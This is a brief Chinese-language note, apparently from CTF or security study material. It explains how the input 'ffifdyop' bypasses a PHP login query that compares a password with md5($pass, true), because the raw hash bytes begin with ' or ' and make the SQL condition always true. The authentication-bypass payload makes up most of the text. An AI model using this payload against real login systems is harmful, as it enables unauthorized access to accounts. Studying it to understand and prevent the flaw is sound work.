# 绕过md5

select \* from 'admin' where password=md5($pass,true);

1. `md5($string, raw)` 第2个参数有如下两种情况
 1. `true`返回16字符的原始二进制数据 /
 2. `false`时候32字符的十六进制字符串万能字符串 `ffifdyop`

md5('ffifdyop') = 276f722736c95d99e921722cf9ed621c

* `27` -> `'` (单引号)
* `6f` -> `o`
* `72` -> `r`
* `27` -> `'` (单引号)
* `36` -> `6`
* ... 后面是其他一些不可见或乱码的二进制字符。

sql 变成 SELECT \* FROM admin WHERE password = ''or'6...'
